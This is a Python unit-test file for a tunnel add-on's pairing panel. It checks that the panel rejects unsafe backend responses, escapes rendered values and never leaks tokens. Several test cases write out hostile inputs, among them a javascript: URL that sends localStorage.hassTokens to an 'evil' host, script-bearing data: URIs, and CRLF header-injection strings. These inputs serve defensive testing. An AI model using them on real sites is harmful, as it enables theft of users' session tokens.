"""Unit tests for the pairing panel flows in frp-mgr/app.py.

Needs FastAPI/Starlette (as installed in the add-on image); skipped otherwise
(set FRP_TESTS_REQUIRE_FASTAPI=1 to turn the skip into a failure, as CI does).
Backend calls and s6 are mocked. Run inside the built image against the
installed panel code, e.g.:

    docker run --rm -v "$PWD/frp-tunnel/tests:/tests:ro" \
        -e FRP_MGR_DIR=/usr/lib/frp-mgr -e FRP_TESTS_REQUIRE_FASTAPI=1 \
        --entrypoint python3 frp-tunnel-test -m unittest discover -s /tests/unit -v
"""
from __future__ import annotations

import http.server
import json
import os
import re
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest import mock

FRP_MGR = Path(
    os.environ.get("FRP_MGR_DIR")
    or Path(__file__).resolve().parents[2] / "rootfs" / "usr" / "lib" / "frp-mgr"
)
sys.path.insert(0, str(FRP_MGR))

try:
    import fastapi  # noqa: F401
    from starlette.requests import Request
except ImportError:  # pragma: no cover - host without FastAPI
    if os.environ.get("FRP_TESTS_REQUIRE_FASTAPI") == "1":
        raise
    fastapi = None

TOKEN = "c" * 64
DEVICE_TOKEN = "DEVICE-TOKEN-SECRET-0123456789"
DEVICE_CODE = "0123456789abcdef" * 4


def make_request() -> "Request":
    return Request({"type": "http", "method": "POST", "path": "/", "headers": [], "query_string": b""})


def get_request(query: bytes = b"") -> "Request":
    return Request({"type": "http", "method": "GET", "path": "/", "headers": [], "query_string": query})


def device_code_response(**extra):
    body = {
        "device_code": DEVICE_CODE,
        "user_code": "ABCD-EF23",
        "verification_uri": "https://app.test/activate",
        "verification_uri_complete": "https://app.test/activate?code=ABCD-EF23",
        "interval": 5,
        "expires_in": 600,
    }
    body.update(extra)
    return body


@unittest.skipIf(fastapi is None, "FastAPI not installed (run inside the add-on image)")
class PanelFlowTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._env = mock.patch.dict(os.environ, {"FRP_DATA_DIR": tempfile.mkdtemp()})
        cls._env.start()
        import app  # noqa: PLC0415 - import after FRP_DATA_DIR is set
        import config as cfg  # noqa: PLC0415

        cls.app = app
        cls.cfg = cfg
        cls.real_http_json = staticmethod(app._http_json)

    @classmethod
    def tearDownClass(cls):
        cls._env.stop()

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.paths = self.cfg.Paths(Path(self._tmp.name))
        self.backend = {}  # (method, path) -> (status, body) or exception
        self.calls = []
        patches = [
            mock.patch.object(self.app, "PATHS", self.paths),
            mock.patch.object(self.app, "OPTIONS", {}),
            mock.patch.object(self.app, "APP_BASE", "https://app.test"),
            mock.patch.object(self.app, "_http_json", side_effect=self._fake_http),
            mock.patch.object(self.app, "OPTION_ERRORS", {}),
            mock.patch.object(self.app, "_restart_frpc"),
            mock.patch.object(self.app, "_stop_frpc", return_value=True),
            mock.patch.object(self.app, "_start_frpc_service"),
            mock.patch.object(self.app, "_frpc_status", return_value="running"),
        ]
        for p in patches:
            p.start()
            self.addCleanup(p.stop)
        self.addCleanup(self._tmp.cleanup)

    def _fake_http(self, method, url, body=None, bearer=None, timeout=15):
        path = url.replace("https://app.test", "")
        self.calls.append((method, path, body, bearer))
        answer = self.backend[(method, path)]
        if isinstance(answer, Exception):
            raise answer
        return answer

    def _tunnel(self, **extra):
        body = {"subdomain": "home", "token": TOKEN, "server_addr": "linumiq.net",
                "server_port": 7001, "domain_base": "dev.linumiq.net"}
        body.update(extra)
        return body

    def _start_pairing(self, **extra):
        self.cfg.write_json(self.paths.pairing, dict({"device_code": DEVICE_CODE, "user_code": "ABCD-EFGH",
                                                      "interval": 5}, **extra))

    def _state(self):
        return json.loads(self.paths.state.read_text())

    # -- pairing -----------------------------------------------------------

    def test_pair_start_stores_validated_values(self):
        self.backend[("POST", "/api/device/code")] = (200, device_code_response(extra="<x>"))
        resp = self.app.pair_start(make_request())
        self.assertIn("ok=", resp.headers["location"])
        stored = json.loads(self.paths.pairing.read_text())
        self.assertEqual(stored["user_code"], "ABCD-EF23")
        self.assertEqual(stored["interval"], 5)
        self.assertNotIn("extra", stored)
        body = self.app.index(get_request()).body.decode()
        self.assertIn('href="https://app.test/activate?code=ABCD-EF23"', body)
        self.assertIn("var interval = 5 * 1000;", body)

    def test_pair_start_rejects_unsafe_responses(self):
        cases = [
            {"verification_uri_complete": "javascript:fetch('//evil/'+localStorage.hassTokens)"},
            {"verification_uri_complete": "https://evil.example/activate"},
            {"verification_uri_complete": "http://app.test/activate"},  # app_base is https
            {"verification_uri": "data:text/html,<script>alert(1)</script>"},
            {"interval": "1;fetch(String.fromCharCode(47,47)+location.host)//"},
            {"interval": 0},
            {"interval": 61},
            {"expires_in": "600"},
            {"user_code": "AB<i>CD"},
            {"user_code": None},
            {"device_code": 'x"' * 10},
        ]
        for extra in cases:
            self.backend[("POST", "/api/device/code")] = (200, device_code_response(**extra))
            with self.subTest(extra=extra):
                with self.assertRaises(self.app.FlashError) as ctx:
                    self.app.pair_start(make_request())
                self.assertIn("Pairing rejected", ctx.exception.message)
                self.assertFalse(self.paths.pairing.exists())
                for value in extra.values():
                    if isinstance(value, str) and len(value) > 4:
                        self.assertNotIn(value, ctx.exception.message)

    def test_stored_unsafe_pairing_is_never_rendered(self):
        # A pairing file written by an older version / tampered with.
        self.cfg.write_json(self.paths.pairing, {
            "device_code": "dc", "user_code": "AB<i>CD",
            "verification_uri_complete": "javascript:fetch('//evil/'+localStorage.hassTokens)",
            "interval": "1;fetch(String.fromCharCode(47,47)+location.host)//"})
        body = self.app.index(get_request()).body.decode()
        self.assertNotIn("javascript:", body)
        self.assertNotIn("fromCharCode", body)
        self.assertNotIn("AB<i>CD", body)
        self.assertIn("Start Pairing", body)
        self.assertEqual(self.app.pair_poll()["status"], "error")  # no pairing in progress

    def test_templates_never_disable_autoescaping(self):
        env = self.app.templates.env
        autoescape = env.autoescape(None) if callable(env.autoescape) else env.autoescape
        self.assertTrue(autoescape)
        for template in (FRP_MGR / "templates").glob("*.html"):
            text = template.read_text()
            self.assertIsNone(re.search(r"\|\s*safe\b", text), template)
            self.assertNotIn("autoescape false", text)
            self.assertNotIn("Markup", text)
            # Values embedded in JavaScript go through |tojson.
            for expr in re.findall(r"<script>(.*?)</script>", text, re.S):
                for jinja in re.findall(r"\{\{(.*?)\}\}", expr):
                    self.assertIn("tojson", jinja, jinja)

    def test_poll_pending_and_slow_down(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (400, {"error": "authorization_pending"})
        self.assertEqual(self.app.pair_poll()["status"], "pending")
        self.backend[("POST", "/api/device/token")] = (429, {"error": "slow_down"})
        self.assertEqual(self.app.pair_poll()["status"], "slow_down")
        self.backend[("POST", "/api/device/token")] = self.app.BackendUnavailable("down")
        self.assertEqual(self.app.pair_poll()["status"], "retry")
        self.assertTrue(self.paths.pairing.exists())

    def test_poll_expired_clears_pairing(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (400, {"error": "expired_token"})
        self.assertEqual(self.app.pair_poll()["status"], "expired")
        self.assertFalse(self.paths.pairing.exists())

    def test_poll_success_persists_server_values_and_renders(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        result = self.app.pair_poll()
        self.assertEqual(result, {"status": "paired", "subdomain": "home"})
        state = self._state()
        self.assertEqual(state["device_token"], DEVICE_TOKEN)
        self.assertEqual(state["token"], TOKEN)
        self.assertEqual(state["domain_base"], "dev.linumiq.net")
        self.assertEqual(state["server_port"], 7001)
        toml = self.paths.frpc_toml.read_text()
        self.assertIn('customDomains = ["home.dev.linumiq.net"]', toml)
        self.assertIn("serverPort = 7001", toml)
        self.assertIn("transport.tls.enable = true", toml)
        self.app._restart_frpc.assert_called_once()
        self.assertFalse(self.paths.pairing.exists())
        # The device token is used as bearer for the tunnel fetch.
        self.assertEqual(self.calls[-1][3], DEVICE_TOKEN)

    def test_poll_keeps_device_token_when_tunnel_fetch_fails(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = self.app.BackendUnavailable("down")
        self.assertEqual(self.app.pair_poll()["status"], "no_tunnel")
        self.assertEqual(self._state()["device_token"], DEVICE_TOKEN)
        self.assertFalse(self.paths.frpc_toml.exists())
        # "Refresh" recovers once the backend is back.
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        resp = self.app.tunnel_refresh(make_request())
        self.assertEqual(resp.status_code, 303)
        self.assertIn("ok=", resp.headers["location"])
        self.assertTrue(self.paths.frpc_toml.exists())

    def test_poll_rejects_malformed_device_token(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": "bad token\r\nX-Evil: 1"})
        result = self.app.pair_poll()
        self.assertEqual(result["status"], "error")
        self.assertNotIn("X-Evil", json.dumps(result))
        self.assertFalse(self.paths.state.exists())

    def test_poll_no_tunnel(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (404, {"error": "no_tunnel"})
        self.assertEqual(self.app.pair_poll()["status"], "no_tunnel")
        self.assertTrue(self.app._view_model()["approved_no_tunnel"])

    def test_poll_rejects_invalid_server_response(self):
        self._start_pairing()
        self.backend[("POST", "/api/device/token")] = (200, {"device_token": DEVICE_TOKEN})
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel(token='x" injected'))
        self.assertEqual(self.app.pair_poll()["status"], "error")
        self.assertFalse(self.paths.frpc_toml.exists())

    # -- refresh / change ----------------------------------------------------

    def _paired(self, **extra):
        state, _ = self.cfg.apply_tunnel_response({"device_token": DEVICE_TOKEN}, self._tunnel(**extra))
        self.cfg.write_json(self.paths.state, state)
        self.cfg.render_from_disk(self.paths)

    def test_refresh_unchanged_does_not_restart(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel())
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("up+to+date", resp.headers["location"])
        self.app._restart_frpc.assert_not_called()

    def test_refresh_picks_up_changed_server_values(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (
            200, self._tunnel(server_port=7000, domain_base="linumiq.net"))
        resp = self.app.tunnel_refresh(make_request())
        self.assertIn("updated", resp.headers["location"])
        self.app._restart_frpc.assert_called_once()
        toml = self.paths.frpc_toml.read_text()
        self.assertIn("serverPort = 7000", toml)
        self.assertIn('customDomains = ["home.linumiq.net"]', toml)

    def test_refresh_with_option_override(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (200, self._tunnel(server_port=7000))
        with mock.patch.object(self.app, "OPTIONS", self.cfg.parse_options({"server_port": 7001})):
            self.app.tunnel_refresh(make_request())
        self.assertIn("serverPort = 7001", self.paths.frpc_toml.read_text())
        self.assertEqual(self._state()["server_port"], 7000)  # server value still persisted

    def test_refresh_unauthorized(self):
        self._paired()
        self.backend[("GET", "/api/device/tunnel")] = (401, {"error": "unauthorized"})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.tunnel_refresh(make_request())
        self.assertIn("pair again", ctx.exception.message)

    def test_subdomain_change_surfaces_server_reason_verbatim(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (400, {"error": "'myhome' is reserved"})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.subdomain_change(make_request(), subdomain="myhome")
        self.assertIn("'myhome' is reserved", ctx.exception.message)

    def test_subdomain_change_success(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (200, self._tunnel(subdomain="newhome", token="d" * 64))
        resp = self.app.subdomain_change(make_request(), subdomain="NewHome")
        self.assertIn("newhome.dev.linumiq.net", resp.headers["location"])
        self.assertEqual(self.calls[-1][2], {"subdomain": "newhome"})
        self.assertIn("d" * 64, self.paths.frpc_toml.read_text())

    def test_reserved_and_invalid_subdomains_rejected_locally(self):
        for bad in ("studio", "localhost", "diun", "ab", "-abc", "a" * 33, "a_b"):
            with self.assertRaises(self.app.FlashError, msg=bad):
                self.app._validate_subdomain(bad)
        self.assertEqual(self.app._validate_subdomain(" My-Home "), "my-home")

    def test_unpair_removes_everything(self):
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        resp = self.app.unpair(make_request())
        self.assertIn("ok=", resp.headers["location"])
        for path in (self.paths.state, self.paths.frpc_toml, self.paths.pairing):
            self.assertFalse(path.exists())
        self.assertEqual(self.calls[-1][:2], ("DELETE", "/api/device/tunnel"))
        self.assertEqual(self.calls[-1][3], DEVICE_TOKEN)

    def test_unpair_order_state_then_stop_then_toml(self):
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (200, {"ok": True})
        events = []

        def stop():
            # State is already gone (a concurrent render answers "not
            # paired"), frpc.toml is only removed once frpc is down.
            events.append(("stop", self.paths.state.exists(), self.paths.frpc_toml.exists()))
            return True

        def start():
            events.append(("start", self.paths.state.exists(), self.paths.frpc_toml.exists()))

        self.app._stop_frpc.side_effect = stop
        self.app._start_frpc_service.side_effect = start
        self.app.unpair(make_request())
        self.assertEqual(events, [("stop", False, True), ("start", False, False)])

    def test_unpair_reports_failed_revocation(self):
        for answer in ((500, {"error": "failed\r\nINFO: forged"}), self.app.BackendUnavailable("down")):
            self._paired()
            self.backend[("DELETE", "/api/device/tunnel")] = answer
            with self.subTest(answer=answer):
                resp = self.app.unpair(make_request())
                location = resp.headers["location"]
                self.assertIn("error=", location)
                self.assertNotIn("ok=", location)
                self.assertIn("unpaired+locally", location)
                self.assertNotIn("%0A", location)
                self.assertNotIn("%0D", location)
                for path in (self.paths.state, self.paths.frpc_toml, self.paths.pairing):
                    self.assertFalse(path.exists())

    def test_unpair_already_revoked_is_ok(self):
        self._paired()
        self.backend[("DELETE", "/api/device/tunnel")] = (401, {"error": "unauthorized"})
        self.assertIn("ok=", self.app.unpair(make_request()).headers["location"])

    # -- configuration problems -----------------------------------------------

    def test_invalid_app_base_option_is_shown_and_blocks_backend_calls(self):
        errors = {"app_base": "app_base='x' is invalid (expected an http(s) URL); it is ignored."}
        with mock.patch.object(self.app, "OPTION_ERRORS", errors):
            body = self.app.index(get_request()).body.decode()
            self.assertIn("Invalid add-on configuration", body)
            self.assertIn("app_base=&#39;x&#39; is invalid", body)
            self.assertEqual(self.app.api_status()["option_errors"], list(errors.values()))
            with self.assertRaises(self.app.FlashError) as ctx:
                self.app.pair_start(make_request())
            self.assertIn("Fix the add-on configuration", ctx.exception.message)
        self.assertEqual(self.calls, [])

    def test_stray_frpc_is_reported_when_unpaired(self):
        status = self.app.api_status()
        self.assertFalse(status["paired"])
        self.assertEqual(status["frpc_status"], "running")  # real status, not "stopped"
        self.assertIn("frpc is running although this device is not paired",
                      self.app.index(get_request()).body.decode())

    # -- backend text hygiene ------------------------------------------------

    def test_backend_error_text_is_single_line(self):
        self._paired()
        self.backend[("POST", "/api/device/tunnel")] = (400, {"error": "bad\r\nINFO: forged\u202e x" + "y" * 500})
        with self.assertRaises(self.app.FlashError) as ctx:
            self.app.subdomain_change(make_request(), subdomain="myhome")
        message = ctx.exception.message
        self.assertTrue(message.isprintable(), repr(message))
        self.assertLess(len(message), 300)

    def test_http_json_refuses_redirects_and_never_echoes_tokens(self):
        hits = []

        class Handler(http.server.BaseHTTPRequestHandler):
            def do_GET(self):  # noqa: N802
                hits.append((self.path, self.headers.get("Authorization")))
                if self.path.startswith("/redirect"):
                    self.send_response(302)
                    self.send_header("Location", f"http://127.0.0.1:{self.server.server_port}/landing")
                    self.end_headers()
                    return
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"ok": true}')

            def log_message(self, *args):
                pass

        server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
        thread = threading.Thread(target=server.serve_forever, daemon=True)
        thread.start()
        self.addCleanup(server.server_close)
        self.addCleanup(server.shutdown)
        base = f"http://127.0.0.1:{server.server_port}"

        self.assertEqual(self.real_http_json("GET", f"{base}/plain", bearer=DEVICE_TOKEN), (200, {"ok": True}))
        with self.assertLogs("frp-mgr", "ERROR") as logs:
            with self.assertRaises(self.app.BackendUnavailable) as ctx:
                self.real_http_json("GET", f"{base}/redirect", bearer=DEVICE_TOKEN)
        self.assertIn("redirect", str(ctx.exception))
        self.assertEqual([path for path, _ in hits], ["/plain", "/redirect"])  # /landing never hit
        self.assertNotIn(DEVICE_TOKEN, " ".join(logs.output) + str(ctx.exception))

        # A malformed token is refused before urllib can echo it in an error.
        with self.assertLogs("frp-mgr", "ERROR") as logs:
            with self.assertRaises(self.app.BackendUnavailable) as ctx:
                self.real_http_json("GET", f"{base}/plain", bearer="SECRETDEVICETOKEN\n")
        self.assertNotIn("SECRETDEVICETOKEN", " ".join(logs.output) + str(ctx.exception))
        self.assertEqual(len(hits), 2)

    def test_http_json_maps_protocol_errors_to_backend_unavailable(self):
        import socket
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        self.addCleanup(listener.close)

        def garbage():
            conn, _ = listener.accept()
            conn.recv(4096)
            conn.sendall(b"NOT-HTTP\r\n\r\n")
            conn.close()

        threading.Thread(target=garbage, daemon=True).start()
        with self.assertLogs("frp-mgr", "ERROR"):
            with self.assertRaises(self.app.BackendUnavailable):
                self.real_http_json("GET", f"http://127.0.0.1:{listener.getsockname()[1]}/x",
                                    bearer=DEVICE_TOKEN)

    # -- UI ----------------------------------------------------------------

    def test_index_renders_every_state(self):
        def page():
            req = get_request(b"error=%3Cb%3Ex%3C%2Fb%3E")
            body = self.app.index(req).body.decode()
            self.assertNotIn(TOKEN, body)
            self.assertNotIn(DEVICE_TOKEN, body)
            self.assertNotIn("<b>x</b>", body)  # flash text is escaped
            return body

        self.assertIn("Start Pairing", page())
        self._start_pairing()
        self.assertIn("ABCD-EFGH", page())
        self.paths.pairing.unlink()
        self.cfg.write_json(self.paths.state, {"device_token": DEVICE_TOKEN})
        self.assertIn("Choose a Subdomain", page())
        self._paired()
        body = page()
        self.assertIn("https://home.dev.linumiq.net", body)
        self.assertIn("linumiq.net:7001", body)
        self.assertIn("Refresh tunnel config", body)

    # -- status / security ---------------------------------------------------

    def test_status_never_contains_secrets(self):
        self._paired()
        status = self.app.api_status()
        dumped = json.dumps(status)
        self.assertNotIn(TOKEN, dumped)
        self.assertNotIn(DEVICE_TOKEN, dumped)
        self.assertTrue(status["paired"])
        self.assertEqual(status["public_url"], "https://home.dev.linumiq.net")
        self.assertEqual(status["sources"]["domain_base"], "server")
        self.assertTrue(status["tls"])

    def test_ingress_allow_list(self):
        nets = self.app._parse_allowed_clients("172.30.32.2, 127.0.0.1,10.89.0.0/24,bogus")
        with mock.patch.object(self.app, "ALLOWED_CLIENT_NETS", nets):
            self.assertTrue(self.app._client_allowed("172.30.32.2"))
            self.assertTrue(self.app._client_allowed("10.89.0.7"))
            self.assertFalse(self.app._client_allowed("172.30.32.3"))
            self.assertFalse(self.app._client_allowed(""))
        with mock.patch.object(self.app, "ALLOWED_CLIENT_NETS", self.app._parse_allowed_clients("fe80::/64")):
            self.assertTrue(self.app._client_allowed("fe80::1"))
            self.assertFalse(self.app._client_allowed("fe80::1%eth0"))


if __name__ == "__main__":
    unittest.main()
